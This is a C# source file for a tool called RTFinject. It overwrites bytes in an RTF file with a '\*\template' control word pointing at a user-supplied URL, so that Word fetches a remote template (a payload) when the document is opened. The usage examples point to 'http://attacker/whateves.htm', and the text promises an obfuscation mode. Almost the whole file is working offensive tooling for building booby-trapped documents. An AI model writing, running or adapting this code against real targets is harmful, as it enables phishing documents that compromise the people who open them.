using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;

namespace RTFinject
{
    class Program
    {
        static void Main(string[] args)
        {

            if (args == null | args.Length == 0)
            {
                Console.WriteLine("\nUSAGE: .\\RTFInject.exe file.rtf {URL}");
                Console.WriteLine("COMING SOON... USAGE: .\\RTFInject.exe obfuscate file.rtf {URL}");
                Console.WriteLine("EXAMPLE: .\\RTFInject.exe file.rtf http://attacker/whateves.htm");
                Console.WriteLine("EXAMPLE: .\\RTFInject.exe obfuscate file.rtf http://attacker/whateves.htm");
            }

            else
            {
                if (args[0].EndsWith(".rtf"))
                {
                    //non-obfuscated
                    if (args[1] != null || args[1].Length != 0)
                    {
                        Console.WriteLine("Not using UTF-16 obfuscation.");

                        string path = Directory.GetCurrentDirectory();
                        string aPath = args[0];
                        string rtfPath = Path.GetFullPath(aPath);

                        Console.WriteLine(rtfPath);

                        if (File.Exists(rtfPath))
                        {
                            Console.WriteLine("RTF found. Making a copy of it.\n");
                            Console.WriteLine(rtfPath);

                            string bak = "OriginalRTF.bak.rtf";

                            if (File.Exists(bak)) { File.Copy(rtfPath, Path.Combine(".\\", Path.GetFileName(bak)), true); } else { File.Copy(rtfPath, "OriginalRTF.bak.rtf"); }

                            string Injection = "{\\*\\template " + args[1] + "}";

                            byte[] urlBytes = Encoding.ASCII.GetBytes(Injection);

                            /*
                            using (StreamReader sr = new StreamReader(rtfPath)) { string contents = sr.ReadToEnd();
                                if (contents.Contains("")){ }
                            }
                            */
                            using (var stream = new FileStream(rtfPath, FileMode.Open, FileAccess.ReadWrite))
                            {
                                stream.Position = 50;
                                stream.Write(urlBytes, 0, urlBytes.Length);
                            }

                        }
                        else
                        {
                            Console.WriteLine("File not found");
                        }
                    }
                    else
                    {
                        Console.WriteLine("URL not provided");
                    }
                }
            }
        }
    }
}
